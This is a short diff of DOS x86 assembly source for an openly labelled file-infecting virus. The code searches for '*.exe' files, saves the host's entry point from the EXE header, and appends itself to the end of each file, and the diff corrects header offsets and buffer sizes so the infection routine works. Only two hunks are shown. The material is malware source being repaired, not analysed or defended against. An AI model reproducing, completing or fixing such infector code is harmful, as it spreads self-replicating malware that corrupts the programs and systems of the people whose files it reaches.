@@ -89,7 +89,7 @@ kill proc
                jne    nextfile
                mov    word ptr [si+2ah],0h
 
-               mov    ax,word ptr [si+02eh]      ;保存原程序入口;;表示14-15H: b.exe 被载入后 IP 的初值是
+               mov    ax,word ptr [si+2ch]      ;保存原程序入口;;表示14-15H: b.exe 被载入后 IP 的初值是
                mov    word ptr [si+014h],ax      ;保存信息在head
 
                xor    cx,cx                      ;到文件尾，病毒代码插入到尾部
@@ -130,7 +130,7 @@ kill proc
 kill endp
 
     filename   db     "*.exe",0
-    dta        db     02bh dup(0)
+    dta        db     030h dup(0)
     string     db     "I'm a kill!",13,10,'$'
     head       db     30h dup(0)
     warnning   db     "virus is detected", 0dh,0ah,24h
